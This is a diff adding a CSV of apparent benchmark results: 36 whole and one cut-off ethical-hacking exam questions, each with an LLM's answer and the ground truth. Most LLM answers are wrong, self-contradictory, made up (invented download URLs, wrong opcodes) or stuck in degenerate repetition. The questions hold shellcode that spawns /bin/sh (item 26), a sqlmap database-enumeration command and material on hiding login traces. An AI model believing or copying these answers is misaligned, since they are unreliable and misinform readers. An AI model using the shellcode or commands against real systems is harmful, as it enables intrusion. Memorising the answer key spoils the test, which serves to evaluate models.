@@ -1,0 +1,2272 @@
+index,question,llm_answer,ground_truth
+1,"You have successfully logged on a Linux system. You want to now cover your trade Your login attempt may
+be logged on several files located in /var/log. Which file does NOT belongs to the list:
+A.  user.log
+B.  auth.fesg
+C.  wtmp
+D.  btmp
+","A, C. The /var/log directory contains several files that are used to record system activity, including user logins, system
+events, and other log messages. The files that belong to the list are all located in the /var/log directory. The
+user.log file contains user login information, including the name and time of login, and the login
+process id. The auth.fesg file is the file used to track failed login attempts. The wtmp file is the file used to
+keep track of the time of last login. The btmp file is the file used to keep track of the number of failed
+system logins. The files are all located in the /var/log directory. The /var/log directory is also used to store
+other logs, such as error logs, system logs, and so on. The system logs are located in the /var/log directory. The",A
+2,"What is the following command used for?
+sqlmap.py-u
+,,http://10.10.1.20/?p=1
+&forumaction=search"" -dbs
+A.  Creating backdoors using SQL injection
+B.  A Enumerating the databases in the DBMS for the URL
+C.  Retrieving SQL statements being executed on the database
+D.  Searching database statements at the IP address given
+","Question: A. Sqlmap.py-u is used to create backdoors using SQL injection. The -dbs flag
+allows you to search for the database tables and views in a database. The -dbs flag
+is used to enumerate the databases in the DBMS for the URL given. The -dbs flag is not used
+to retrieve SQL statements being executed on the database. This is an example of an SQLi
+attack. The -dbs flag is used to enumerate the databases in the DBMS for the URL given. The
+-dbs flag is not used to retrieve SQL statements being executed on the database. This is an example
+of an SQLi attack. The -dbs flag is used to enumerate the databases in the DBMS for the URL given.
+The -dbs flag is not used to retrieve SQL statements being executed on the database. This is an
+example of an SQLi attack. The -dbs flag is used to enumerate the databases in",B
+3,"Sam, a web developer, was instructed to incorporate a hybrid encryption software program into a web
+application to secure email messages. Sam used an encryption software, which is a free implementation of the
+OpenPGP standard that uses both symmetric-key cryptography and asymmetric-key cryptography for
+improved speed and secure key exchange. What is the encryption software employed by Sam for securing the
+email messages?
+A.  PGP
+B.  S/MIME
+C.  SMTP
+D.  GPG
+","This is a good question. The OpenPGP standard uses both symmetric-key and asymmetric-key cryptography for
+secure communication. Asymmetric-key cryptography is used to encrypt the data, and symmetric-key cryptography is
+used to decrypt the data. The PGP standard is not an encryption software program, but an open-source software
+program that provides an OpenPGP implementation. SMTP is the standard for sending email. GPG is a free open-source
+program that provides an OpenPGP implementation. S/MIME is a proprietary software program used for secure
+email communication. In this case, the email messages are encrypted using the OpenPGP standard. The application
+is not used for secure email communication. The application is used for secure web application development.
+A hybrid encryption software program is one that uses both symmetric-key cryptography and asymmetric-key
+cryptography for improved speed and secure key exchange. It is not used for secure email communication.
+D is incorrect because GPG is not an encryption software program.",D
+4,"Which of the following is assured by the use of a hash?
+A.  Authentication
+B.  Confidentiality
+C.  Availability
+D.  Integrity
+","A. A hash is an algorithm that takes an input, usually a string, and returns a digest of the string. It is used to provide a secure means of ensuring the integrity of the data. The hash is not used to ensure confidentiality or availability. It is also not used to ensure authentication.",D
+5,"What is not a PCI compliance recommendation?
+A.  Use a firewall between the public network and the payment card data.
+B.  Use encryption to protect all transmission of card holder data over any public network.
+C.  Rotate employees handling credit card transactions on a yearly basis to different departments.
+D.  Limit access to card holder data to as few individuals as possible.
+","Question: D. Limit access to card holder data to as few individuals as possible. PCI compliance is all about limiting access to cardholder data, which is the same thing as limiting access to the system. A firewall between the public network and the payment card data is not a recommendation. Encryption is not a recommendation. Rotating employees handling credit card transactions on a yearly basis to different departments is not a recommendation. And limiting access to cardholder data to as few individuals as possible is not a recommendation. The PCI DSS is a document that details a number of recommendations for ensuring compliance. It’s not a checklist, so it’s not a recommendation. The PCI DSS is a document that details a number of recommendations for ensuring compliance. It’s not a checklist, so it’s not a recommendation. The PCI DSS is a document that details a number of recommendations for ensuring compliance. It’s not a checklist, so it’s not a recommendation. The PCI DSS is a document that details",C
+6,"What is the proper response for a NULL scan if the port is closed?
+A.  SYN
+B.  ACK
+C.  FIN
+D.  PSH
+E.  RST
+F.  No response
+","This is a very simple question about a simple question.  The answer is fairly straightforward.  The SYN
+packet is used to initiate a connection, and the response is to close the connection.  The response is
+usually a SYN/ACK.  The PSH is used for a push, and the RST is used for a reset.  The other
+options are not used for this question.  This is a simple question about a simple question.  The response is
+very easy to get wrong.  The question is asking you to choose the correct response to a question about
+a simple question.  The response is very simple, and the question is straightforward.  The response is
+not a question about a question about a simple question.  The response is not a question about a question
+about a simple question.  The response is not a question about a simple question.  The response is not a
+question about a simple question.  The response is not",E
+7,"What kind of detection techniques is being used in antivirus software that identifies malware by collecting data
+from multiple protected systems and instead of analyzing files locally it?s made on the provider?s
+environment?
+A.  Behavioral based
+B.  Heuristics based
+C.  Honeypot based
+D.  Cloud based
+","The honeypot is a virtual system that simulates a system that is infected with malware. The goal of the honeypot is to gather
+information about the malware and the methods used to spread it. It is designed to collect information about the infected system
+and its environment, including files and registry entries. This information is used to identify the malware and then the
+provider will take action on the system. This is a cloud based honeypot. Honeypots are used to detect malware by
+scanning the system and gathering information from the system. The provider will take action on the system when the
+honey pot is identified. The honeypot is not a behavioral based honeypot, as it is not collecting information from
+the system to identify malware. The honeypot is not a heuristic based honeypot, as it is not using heuristic information
+to identify malware. The honeypot is not a cloud based honeypot, as it is",D
+8,"Which type of security feature stops vehicles from crashing through the doors of a building?
+A.  Bollards
+B.  Receptionist
+C.  Mantrap
+D.  Turnstile
+","This is a question about cybersecurity. Please write an answer.
+
+  A, B, C, D.  A mantrap is a barrier that allows vehicles to enter a building but stops them from leaving. The barrier is usually a gate or a wall. The barrier is designed to stop vehicles from crashing through the doors of the building. A bollard is a metal post or pole that is placed in the ground to stop vehicles from entering a parking lot. A receptionist is a person who greets visitors at the entrance of a building. A turnstile is a barrier that allows people to enter and exit a building without stopping. A turnstile is usually made of metal and is designed to stop people from entering or leaving the building. It is usually placed at the entrance or exit of a building. It is not designed to stop vehicles from crashing through the doors of a building.",A
+9,"A large mobile telephony and data network operator has a data center that houses network elements. These are
+essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and
+IPS systems.
+What is the best security policy concerning this setup?
+A.  Network elements must be hardened with user ids and strong passwords. Regular security tests and audits should be performed.
+B.  As long as the physical access to the network elements is restricted, there is no need for additional measures.
+C.  There is no need for specific security measures on the network elements as long as firewalls and IPSsystems exist.
+D.  The operator knows that attacks and down time are inevitable and should have a backup site.
+","The best security policy would be to harden the network elements. The physical access to the network elements should
+be restricted, and there should be a backup site in place. The best way to do this would be to use a VPN. If you
+cannot afford a VPN, then you should be running a network segmentation firewall and IPS systems to provide
+security. The operator knows that attacks and down time are inevitable, and they are prepared to mitigate the
+risks. The backup site is a physical location that would be used to protect against a disaster.
+A is incorrect because the network elements should not be hardened. The physical access to the network elements should
+be restricted, and there should be a backup site in place. The best way to do this would be to use a VPN.
+If you cannot afford a VPN, then you should be running a network segmentation firewall and IPS systems to provide
+security. The operator knows that attacks and down time are inevitable, and they are prepared to",A
+10,"Which regulation defines security and privacy controls for Federal information systems and organizations?
+A.  HIPAA
+B.  EU Safe Harbor
+C.  PCI-DSS
+D.  NIST-800-53
+","# D. PCI-DSS is the Payment Card Industry Data Security Standard, which is a set of standards for security
+requirements for payment card industry systems and merchants. It is a voluntary standard. HIPAA is the Health Insurance
+Portability and Accountability Act, which is a law that protects privacy and security of personal health information.
+NIST-800-53 is the National Institute of Standards and Technology’s 800-53, which is a set of standards for IT
+security controls. EU Safe Harbor is the European Union’s Safe Harbor Privacy Principles, which are a set of
+standards for privacy and security for personal information. There is no regulation that defines security and privacy
+controls for Federal information systems and organizations.",D
+11,"is a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so
+as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks.
+A.  DNSSEC
+B.  Resource records
+C.  Resource transfer
+D.  Zone transfer
+","# B. The DNS Security Extensions (DNSSEC) are a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks. The DNS Security Extensions are a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks. The DNS Security Extensions are a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks. The DNS Security Extensions are a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks. The DNS Security Extensions are a set of extensions to DNS that",A
+12,"A hacker is an intelligent individual with excellent computer skills and the ability to explore a computer?s
+software and hardware without the owner?s permission. Their intention can either be to simply gain knowledge
+or to illegally make changes.
+Which of the following class of hacker refers to an individual who works both offensively and defensively at
+various times?
+A.  White Hat
+B.  Suicide Hacker
+C.  Gray Hat
+D.  Black Hat
+","This is a good question. The term white hat refers to a hacker who is trying to gain knowledge. The term black
+hat refers to an individual who is trying to make changes to the system without the owner?s permission. The term
+gray hat refers to an individual who is trying to do both. A suicide hacker is an individual who is trying to kill
+himself. The term black hat refers to an individual who is trying to make changes to the system without the
+owner?s permission. A gray hat refers to an individual who is trying to do both. The term white hat refers to an
+individual who is trying to gain knowledge. A suicide hacker is an individual who is trying to kill himself.
+A gray hat refers to an individual who is trying to do both. The term black hat refers to an individual who is
+trying to make changes to the system without the owner?s permission. The term white hat refers to an individual
+who is trying to gain knowledge. A suicide",C
+13,"Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets
+to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be
+used to perform session splicing attacks?
+A.  tcpsplice
+B.  Burp
+C.  Hydra
+D.  Whisker
+","A, B, C, D. Hydra is a tool that can be used to perform a DoS attack, but it is not an IDS evasion tool. Burp is a tool that can be used for both
+an IDS and a sniffer, but it is not a tool used for session splicing. Whisker is a tool that can be used to sniff traffic. tcpsplice is a tool that can be used to
+perform session splicing attacks. The tools listed here are not used for session splicing.",D
+14,"An incident investigator asks to receive a copy of the event logs from all firewalls, proxy servers, and
+Intrusion Detection Systems (IDS) on the network of an organization that has experienced a possible breach of
+security. When the investigator attempts to correlate the information in all of the logs, the sequence of many of
+the logged events do not match up.
+What is the most likely cause?
+A.  The network devices are not all synchronized.
+B.  Proper chain of custody was not observed while collecting the logs.
+C.  The attacker altered or erased events from the logs.
+D.  The security breach was a false positive.
+","This is a common scenario, and it is not difficult to imagine how an attacker could change or alter the sequence of
+events in the logs. In this case, the sequence of events would not match because the attacker is trying to alter
+events. In addition, the sequence of events would not match because the attacker is trying to alter the
+events. The other two are incorrect because the security breach was not a false positive. If you have a false positive
+in your logs, it would not be possible to correlate the events in all of the logs.
+A is incorrect because the devices are not synchronized. If the devices are not synchronized, they are not
+collecting the same events. The sequence of events would not match because the devices are not synchronized.
+B is incorrect because the investigator did not observe proper chain of custody while collecting the logs. If
+the logs were not properly collected, the sequence of events would not match.
+C is incorrect because the attacker altered or erased events from",A
+15,"A zone file consists of which of the following Resource Records (RRs)?
+A.  DNS, NS, AXFR, and MX records
+B.  DNS, NS, PTR, and MX records
+C.  SOA, NS, AXFR, and MX records
+D.  SOA, NS, A, and MX records
+","The zone file is the database that holds all of the information for the domain name system. It consists of the DNS zone file, which is the zone file plus any other files that may be used by the zone file. The zone file is a text file, and the RR is a resource record. The RR is a line in the zone file that contains a key and value. The key is the name of the resource, and the value is the value of the resource. The zone file is divided into sections, and each section is called a zone. Each zone has its own RR section, and each RR section has its own set of key-value pairs. In addition, the zone file can also include other files, such as MX records. The SOA record is a resource record that is used to set the nameservers for the domain. The NS record is used to inform other DNS servers of the zone file’s owner. The PTR record is used to reverse a hostname to an IP address",D
+16,"If a tester is attempting to ping a target that exists but receives no response or a response that states the
+destination is unreachable, ICMP may be disabled and the network may be using TCP. Which other option
+could the tester use to get a response from a host using TCP?
+A.  Traceroute
+B.  Hping
+C.  TCP ping
+D.  Broadcast ping
+","The traceroute command can be used to determine if a packet is getting through. If the destination is unreachable, the
+traceroute will bounce back an ICMP message stating the destination is unreachable. This is a good option to use when
+you are testing for port 80. TCP ping is used to verify TCP connections are open. The ping command sends a
+packet to a host and waits for a response. If the response is not a SYN, the host is not listening on TCP port 80. If the
+response is SYN, the host is listening on port 80. Broadcast ping is used to ping all hosts on the network. This is
+a good option to use when you want to ping a host that is not on the same subnet as you. The ICMP message is
+bounced back stating the destination is unreachable. This is not a good option to use when you are testing for
+port 80. TCP ping is used to verify TCP connections are open. The ping",B
+17,"This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to
+protect sensitive data, such as GCMP-2S6. MMAC-SHA384, and ECDSA using a 384-bit elliptic curve.
+Which is this wireless security protocol?
+A.  WPA2 Personal
+B.  WPA3-Personal
+C.  WPA2-Enterprise
+D.  WPA3-Enterprise
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, D. 802.11i, 802.11i, and 802.11i+e are all wireless security protocols. WPA2-Personal is an
+802.11i standard. WPA3 is the latest version of the standard. WPA3-Personal is not a standard.
+ECDSA uses a 256-bit elliptic curve.
+ECDSA is an asymmetric encryption standard. It uses a 256-bit elliptic curve to encrypt data. It is used
+for digital signatures.",D
+18,"John, a professional hacker, targeted an organization that uses LDAP for accessing distributed directory
+services. He used an automated tool to anonymously query the IDAP service for sensitive information such as
+usernames. addresses, departmental details, and server names to launch further attacks on the target
+organization.
+What is the tool employed by John to gather information from the IDAP service?
+A.  jxplorer
+B.  Zabasearch
+C.  EarthExplorer
+D.  Ike-scan
+","This is a simple tool to search for information on an LDAP server. It uses a number of different
+methods to query the server. One of these is the LDAP search tool, which allows you to search for specific
+fields and return results. It can be used to find information such as usernames, passwords, and other
+data. John used it to gather information from the IDAP server, which is used to access the directory
+services on a server. The tool is free and can be downloaded at the following website:
+https://www.jxplorer.org/.
+A is incorrect because jxplorer is a tool used to search the LDAP directory service. EarthExplorer is a tool
+used to search the World Wide Web and can be downloaded at http://www.eearthexplorer.com/.
+Ike-scan is a tool used to scan the Web for vulnerabilities. It can be downloaded at http://www.ike-scan.com/.
+C is incorrect because EarthExplorer is a tool used to search",A
+19,"A friend of yours tells you that he downloaded and executed a file that was sent to him by a coworker. Since
+the file did nothing when executed, he asks you for help because he suspects that he may have installed a
+trojan on his computer.
+what tests would you perform to determine whether his computer Is Infected?
+A.  Use ExifTool and check for malicious content.
+B.  You do not check; rather, you immediately restore a previous snapshot of the operating system.
+C.  Upload the file to VirusTotal.
+D.  Use netstat and check for outgoing connections to strange IP addresses or domains.
+","This is a good question. In this case, the question is asking about a friend of yours, and the
+answer is based on a friend’s choice of words. The friend is not a trojan. In this case, the friend is
+trying to determine whether his computer is infected. He is not asking for a test. The question is asking
+what test he would perform to determine whether his computer is infected. The answer is A. Using
+ExifTool, he would look for malicious content. You do not check. The friend is not immediately restoring
+a previous snapshot of the operating system. You do not use netstat. He would not upload the file to
+VirusTotal. The friend is not using an unknown IP address or domain. The friend is not using an
+unknown service. You do not use a port scan. The friend is not using a remote desktop connection. In
+other words, the friend is not using a remote desktop connection or a port",D
+20,"Which type of sniffing technique is generally referred as MiTM attack?
+A.  Password Sniffing
+B.  ARP Poisoning
+C.  Mac Flooding
+D.  DHCP Sniffing
+","The MITM attack is a man-in-the-middle attack. It involves an attacker intercepting a packet and sending it to the target. The attacker can modify it to make it appear as though it was sent from the target, so the target thinks the packet was sent from the attacker. This is done by sending a fake packet and then replying to it. The attacker can also use this technique to inject a fake ARP response to the target. The target will think the packet was sent from the attacker, but it will be coming from the target. This can be used to steal ARP information, so the attacker can then send the target an ARP request, which will appear to come from the attacker. This is a man-in-the-middle attack. The target will see the ARP response as though it was sent from the attacker. This is done by replying to the ARP request. This is not password sniffing. This is not DHCP sniffing. This is not MAC flooding. This is not",B
+21,"Johnson, an attacker, performed online research for the contact details of reputed cybersecurity firms. He
+found the contact number of sibertech.org and dialed the number, claiming himself to represent a technical
+support team from a vendor. He warned that a specific server is about to be compromised and requested
+sibertech.org to follow the provided instructions. Consequently, he prompted the victim to execute unusual
+commands and install malicious files, which were then used to collect and pass critical Information to
+Johnson's machine. What is the social engineering technique Steve employed in the above scenario?
+A.  Quid pro quo
+B.  Diversion theft
+C.  Elicitation
+D.  Phishing
+","This is a social engineering attack. Social engineering is a set of techniques used to trick people into divulging
+information, including passwords, credit card numbers, social security numbers, and so on. The goal is to
+obtain access to systems and networks, and the information on them. The key to successful social engineering is
+getting the target to believe they are doing something they are not. In this case, Johnson was able to get
+the victim to do the following: (1) dial the contact number and claim to be from a technical support team, (2)
+request the victim to execute commands, and (3) provide the victim with a link to download a file. This is
+essentially a diversion theft social engineering attack. In this case, Johnson was able to obtain the victim's
+password and access to the server. It is important to note that social engineering is not just for the
+perpetrator. The victim is a part of the equation and should",A
+22,"There have been concerns in your network that the wireless network component is not sufficiently secure. You
+perform a vulnerability scan of the wireless network and find that it is using an old encryption protocol that
+was designed to mimic wired encryption, what encryption protocol is being used?
+A.  WEP
+B.  RADIUS
+C.  WPA
+D.  WPA3
+","The wireless network is using WEP encryption. WEP is a legacy encryption standard that is used to protect wireless
+networks. It was designed to be easy to implement and easy to use, but it is not secure. WEP is based on
+RC4, which is a cryptographic algorithm that is used to generate a key for each packet. The key is encrypted
+with RC4, which is a one-time pad. WEP is vulnerable to attack and should not be used. RADIUS is a
+protocol used to authenticate users to a network. WPA is a newer wireless encryption standard that uses
+RC4 and AES. WPA3 is a newer wireless encryption standard that uses AES. None of these are encryption
+protocols. This is a good question for an ethical hacker. It is a good question for a pen test. It is a good question for
+a pen test. It is a good question for a pen test. It is a good question for a pen test",A
+23,"Wilson, a professional hacker, targets an organization for financial benefit and plans to compromise its
+systems by sending malicious emails. For this purpose, he uses a tool to track the emails of the target and
+extracts information such as sender identities, mall servers, sender IP addresses, and sender locations from
+different public sources. He also checks if an email address was leaked using the haveibeenpwned.com API.
+Which of the following tools is used by Wilson in the above scenario?
+A.  Factiva
+B.  Netcraft
+C.  infoga
+D.  Zoominfo
+","# B.  Wilson is using the haveibeenpwned.com API, which is an open-source website that allows anyone to check
+if their email address has been leaked. It is a very useful tool for anyone looking to find out if an email address
+has been compromised. This is a great tool for security professionals, as well as anyone who is interested in
+email security. The haveibeenpwned.com API is a great tool to use when you want to check if an email address
+has been leaked. This is a great tool for anyone looking to check if an email address has been compromised.
+Factiva is a tool that allows you to search for news articles. It is a useful tool to use for information
+security professionals, as well as anyone looking to find information on a target. This is a great tool for
+security professionals, as well as anyone looking to find information on a target. The haveibeenpwned.com API is",C
+24,"Allen, a professional pen tester, was hired by xpertTech solutWns to perform an attack simulation on the
+organization's network resources. To perform the attack, he took advantage of the NetBIOS API and targeted
+the NetBIOS service. B/enumerating NetBIOS, he found that port 139 was open and could see the resources
+that could be accessed or viewed on a remote system. He came across many NetBIOS codes during
+enumeration.
+identify the NetBIOS code used for obtaining the messenger service running for the logged-in user?
+A.  <1B>
+B.  <00>
+C.  <03>
+D.  <20>
+","This is a trick question. NetBIOS is a protocol that allows remote machines to share information between
+networked computers. It is used for file transfers, printing, and other functions. The code used for
+obtaining the messenger service running for the logged-in user is 03. The 03 is the NetBIOS code for
+the service. The 00 is the NetBIOS code for the NetBIOS service itself.
+A is incorrect because this code is used for NetBIOS session sharing, which is a feature of the NetBIOS
+protocol.
+C is incorrect because this is the NetBIOS code for the NetBIOS broadcast service. The 20 is the NetBIOS code for
+the NetBIOS broadcast service.
+D is incorrect because this is the NetBIOS code for the NetBIOS service that provides access to the
+shared memory space. The 01 is the NetBIOS code for the NetBIOS service that provides access",C
+25,"When discussing passwords, what is considered a brute force attack?
+A.  You attempt every single possibility until you exhaust all possible combinations or discover the password
+B.  You threaten to use the rubber hose on someone unless they reveal their password
+C.  You load a dictionary of words into your cracking program
+D.  You create hashes of a large number of words and compare it with the encrypted passwords
+E.  You wait until the password expires
+","B. A brute force attack is one that attempts every possible combination of characters in a password. It can be
+done with a dictionary attack, a brute force attack, or a rainbow table attack. In this case, it’s a
+brute force attack. The dictionary attack attempts every possible combination of characters in a word list.
+The rainbow table attack is a dictionary attack, but with the addition of a precomputed table. A
+rainbow table is a table of all the possible combinations of characters, and it’s used to compare a
+password with the encrypted password. The rubber hose is an old standby in the security world. It’s
+a tool that can be used to damage a computer system, but it’s not a password cracking tool.
+A dictionary attack is a word list of passwords, and it’s used to compare the password with a word list.
+In a rainbow table attack, a table of",A
+26,"You are programming a buffer overflow exploit and you want to create a NOP sled of 200 bytes in the
+program exploit.c
+
+char shellcode[]=
+""\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0""
+""\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d""
+""\x53\x0c\xcd\x80\xe8\xe5\xff\xff\x2f\x62\x69\x6e\x2f\x73""
+""\x68"";
+
+
+
+What is the hexadecimal value of NOP instruction?
+A.  0x60
+B.  0x80
+C.  0x70
+D.  0x90
+","The NOP instruction is a very simple instruction that does nothing. It’s just a series of zeros
+and ones that makes the program stop executing. This is a good thing to know about in a buffer
+overflow exploit because it will stop the program from executing the exploit code. It’s also a good thing
+to know because it’s a good way to tell when you’ve found a buffer overflow exploit. You can see
+that the NOP sled is 200 bytes long because it’s a 200-byte NOP sled. The 0x60 is a hexadecimal
+value for the NOP instruction. In other words, it’s the same as 00000000000000000000000000000060. The
+0x80 is the hexadecimal value for the STOP instruction, which is a 0x80 NOP instruction. The 0x70 is the
+hexadecimal value for the PUSH instruction, which is a 0x70 NOP instruction. The 0x90 is the hexadecimal",D
+27,"Yancey is a network security administrator for a large electric company. This company provides power for
+over 100, 000 people in Las Vegas. Yancey has worked for his company for over 15 years and has become
+very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he
+will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and
+backdoors all over the network to take down the company once he has left. Yancey does not care if his actions
+land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him.
+What would Yancey be considered?
+A.  Yancey would be considered a Suicide Hacker
+B.  Since he does not care about going to jail, he would be considered a Black Hat
+C.  Because Yancey works for the company currently; he would be a White Hat
+D.  Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing
+","def B. A Black Hat Hacker would be a person who is working against the company in a positive way, while a White Hat
+Hacker is a person who is working for the company and is trying to make it better. A Suicide Hacker would be a person
+who is trying to kill the company. A Hacktivist Hacker would be a person who is working against the company in a
+negative way. Since Yancey is working for the company, he is a White Hat Hacker. He is not a Black Hat Hacker.",A
+28,"Why containers are less secure that virtual machines?
+A.  Host OS on containers has a larger surface attack.
+B.  Containers may full fill disk space of the host.
+C.  A compromise container may cause a CPU starvation of the host.
+D.  Containers are attached to the same virtual network.
+","This is a false statement. Containers are less secure than virtual machines because they do not have the same level of isolation as virtual machines. A container is not attached to the same virtual network as the host, so the host OS cannot be compromised. The host OS is not the only thing that makes virtual machines secure. The CPU starvation of the host OS is not an issue with containers. Containers are also less secure because they do not have the same level of isolation as virtual machines. The host OS cannot be compromised, but a compromise container could cause a CPU starvation of the host. The disk space is not an issue with containers because a container is not attached to the same virtual network as the host, so there is no disk space available to the container.",A
+29,"George is a security professional working for iTech Solutions. He was tasked with securely transferring
+sensitive data of the organization between industrial systems. In this process, he used a short-range
+communication protocol based on the IEEE 203.15.4 standard. This protocol is used in devices that transfer
+data infrequently at a low rate in a restricted area, within a range of 10-100 m. What is the short-range wireless
+communication technology George employed in the above scenario?
+A.  MQTT
+B.  LPWAN
+C.  Zigbee
+D.  NB-IoT
+","from the organization, George uses the short-range wireless communication technology Zigbee. Zigbee is a
+wireless standard based on the IEEE 802.15.4 standard, which is a part of the 802.15.4 family of standards.
+It was created for the industrial automation and control industry. Zigbee is used for short-range communication
+of small amounts of data at low rates in a restricted area. Zigbee uses the 868 MHz band and operates at 868.5-868.7
+MHz. It is used in industrial automation, medical devices, smart meters, and other devices that require short-range
+communication. It is a proprietary standard, owned by the Zigbee Alliance, and is licensed to other companies
+for use in their products. It is a low-power, low-rate, and low-data-rate wireless technology. The short-range
+wireless communication technology used in the scenario is Zigbee. Zigbee is used for short-range wireless
+communication of small",C
+30,"You are performing a penetration test for a client and have gained shell access to a Windows machine on the
+internal network. You intend to retrieve all DNS records for the internal domain, if the DNS server is at
+192.168.10.2 and the domain name is abccorp.local, what command would you type at the nslookup prompt to
+attempt a zone transfer?
+A.  list server=192.168.10.2 type=all
+B.  is-d abccorp.local
+C.  Iserver 192.168.10.2-t all
+D.  List domain=Abccorp.local type=zone
+","This is a true/false question. A, B, C, D. The nslookup command is used to query the DNS server for the name servers of a
+given domain. The is-d command is used to query the DNS server for a specific domain. The Iserver command
+is used to query the DNS server for the IP address of a specific host. The list server command is used to query
+the DNS server for all the name servers of a domain. The is-type command is used to query the DNS server for a
+specific type of resource record. The zone transfer command is used to transfer a zone file to the DNS server.
+The zone transfer is the process of transferring a zone file from the client to the DNS server. The zone file is
+a text file that contains the name server and resource records for a domain. The zone transfer is used to
+transfer a zone file from the client to the DNS server. The zone transfer is used to transfer a zone file from",B
+31,"_________ is a tool that can hide processes from the process list, can hide files, registry entries, and intercept
+keystrokes.
+A.  Trojan
+B.  RootKit
+C.  DoS tool
+D.  Scanner
+E.  Backdoor
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, D, E. A Trojan is a program that is designed to perform malicious actions. It can hide processes from the process list, can hide files, registry entries, and intercept keystrokes. A rootkit is a collection of tools that can do the same things as a Trojan, but it is designed to be installed on the system. A DoS tool is a program that can flood the system with packets. A scanner is a tool used to test a network for security vulnerabilities. A backdoor is a program that allows an administrator to gain access to the system, without the user knowing about it. It can also be used for malicious purposes.",B
+32,"Nathan is testing some of his network devices. Nathan is using Macof to try and flood the ARP cache of these
+switches.
+If these switches' ARP cache is successfully flooded, what will be the result?
+A.  The switches will drop into hub mode if the ARP cache is successfully flooded.
+B.  If the ARP cache is flooded, the switches will drop into pix mode making it less susceptible to attacks.
+C.  Depending on the switch manufacturer, the device will either delete every entry in its ARP cache or reroute packets to the nearest switch.
+D.  The switches will route all traffic to the broadcast address created collisions.
+","This is a true statement. The ARP cache is a cache of the IP addresses of devices on the network. If the ARP cache is flooded, it will be flooded and the switches will drop into hub mode. If the ARP cache is flooded, the switches will route all traffic to the broadcast address created collisions. If the ARP cache is not flooded, the switches will not drop into hub mode. If the ARP cache is not flooded, the switches will not route all traffic to the broadcast address created collisions. The switches will not drop into pix mode. The switches will not delete every entry in their ARP cache or reroute packets to the nearest switch. If the ARP cache is flooded, the switches will not delete every entry in their ARP cache or reroute packets to the nearest switch. The switches will not delete every entry in their ARP cache or reroute packets to the nearest switch. If the ARP cache is not flooded, the switches will not delete every entry in their ARP cache or reroute",A
+33,"what firewall evasion scanning technique make use of a zombie system that has low network activity as well
+as its fragment identification numbers?
+A.  Decoy scanning
+B.  Packet fragmentation scanning
+C.  Spoof source address scanning
+D.  Idle scanning
+","A, B, D.  A, B, and D are all false. The first is a decoy scanning technique, which uses a zombie system that has low network activity as well as its fragment identification numbers to evade detection. In a decoy scanning attack, a zombie system is used to generate traffic that appears to be legitimate traffic to the target system. The zombie system will then send the legitimate traffic to the target system, and the legitimate traffic will be dropped by the target system. The target system will then send a response to the zombie system, and the response will be dropped by the zombie system. The response traffic will be forwarded to the target system, and the target system will send a response to the zombie system. The response traffic will be dropped by the zombie system. The target system will then send a response to the decoy system, and the response traffic will be forwarded to the decoy system",D
+34,"Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the Integrity of
+updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT.
+POST. GET. and DELETE and can improve the overall performance, visibility, scalability, reliability, and
+portability of an application. What is the type of web-service API mentioned in the above scenario?
+A.  JSON-RPC
+B.  SOAP API
+C.  RESTful API
+D.  REST API
+","This is a question about cybersecurity. Please write an answer.
+
+ C. REST API is the type of web-service API that is used to communicate between a client and a server. It is a lightweight protocol that uses HTTP methods and JSON. It is used for the transport of information between the client and the server. REST API is a lightweight protocol that uses HTTP methods and JSON. It is used for the transport of information between the client and the server. REST API is used for the transport of information between the client and the server. It is a lightweight protocol that uses HTTP methods and JSON. It is used for the transport of information between the client and the server. It is used for the transport of information between the client and the server. It is used for the transport of information between the client and the server. It is used for the transport of information between the client and the server. It is used for the transport of information between the client and the server. It is used for the transport",C
+35,"What is the BEST alternative if you discover that a rootkit has been installed on one of your computers?
+A.  Copy the system files from a known good system
+B.  Perform a trap and trace
+C.  Delete the files and try to determine the source
+D.  Reload from a previous backup
+E.  Reload from known good media
+","This is a great question. It’s a good way to test your knowledge of operating systems. This is a great question because it forces you to think about the steps you would take if you were in the same situation. The answer is D. The other options are not the best because they don’t involve a trap and trace or a reload. The other options are not the best because they don’t involve a good backup. The best alternative is to copy the system files from a known good system. If you don’t have a known good system, you can reload from a previous backup. If you don’t have a previous backup, you can reload from known good media. If you don’t have known good media, you can reload from a known good system. If you don’t have a known good system, you can perform a trap and trace. The trap and trace is a way to capture all the files and registry keys on the system. The trap is a way to capture all the",E
+36,"Annie, a cloud security engineer, uses the Docker architecture to employ a client/server model in the
+application she is working on. She utilizes a component that can process API requests and handle various
+Docker objects, such as containers, volumes. Images, and networks. What is the component of the Docker
+architecture used by Annie in the above scenario?
+A.  Docker client
+B.  Docker objects
+C.  Docker daemon
+D.  Docker registries
+","This is a very simple question. Annie is using Docker as a container orchestration tool, which means she is
+using a client/server model. The client is the software Annie uses to communicate with Docker. The server is the
+Docker daemon, which is the engine that runs the Docker software. The registry is the place where images are
+stored. This is a very simple question, and you can easily remember it by thinking of the client as the software
+running on Annie’s machine. The server is the Docker daemon, which is running on a remote server somewhere.
+The registry is the place where Annie can store images. The registry is not a component of the Docker
+architecture.",C
+37,"Widespread fraud ac Enron. WorldCom, and Tyco led to the creation of a law that was designed to improve
